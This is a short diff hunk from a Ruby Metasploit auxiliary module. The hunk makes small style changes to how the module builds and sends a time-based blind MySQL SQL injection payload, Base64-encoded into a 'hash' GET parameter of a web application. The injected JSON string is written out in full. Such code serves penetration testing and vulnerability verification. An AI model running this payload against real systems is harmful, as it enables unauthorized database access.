@@ -59,15 +59,15 @@ class MetasploitModule < Msf::Auxiliary
     email = "#{Rex::Text.rand_text_alpha(8)}@#{Rex::Text.rand_text_alpha(8)}.com"
 
     @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind) do |payload|
-      data = %Q|{"contact_id":"100','100','100','3'),('1594999398','1594999398','1',(1) AND #{payload},'100','100','3'),|
-      data << %Q|('1594999398','1594999398','1','100","campaign_id":"100","message_id":"100","email":"#{email}","guid":"#{guid}","action":"open"}|
+      data = %|{"contact_id":"100','100','100','3'),('1594999398','1594999398','1',(1) AND #{payload},'100','100','3'),|
+      data << %|('1594999398','1594999398','1','100","campaign_id":"100","message_id":"100","email":"#{email}","guid":"#{guid}","action":"open"}|
 
       res = send_request_cgi({
         'method' => 'GET',
         'uri' => normalize_uri(target_uri.path),
         'vars_get' => {
-          'hash' => Base64.encode64(data),
-          'es' => 'open',
+          'hash' => Base64.strict_encode64(data),
+          'es' => 'open'
         }
       })
       fail_with Failure::Unreachable, 'Connection failed' unless res
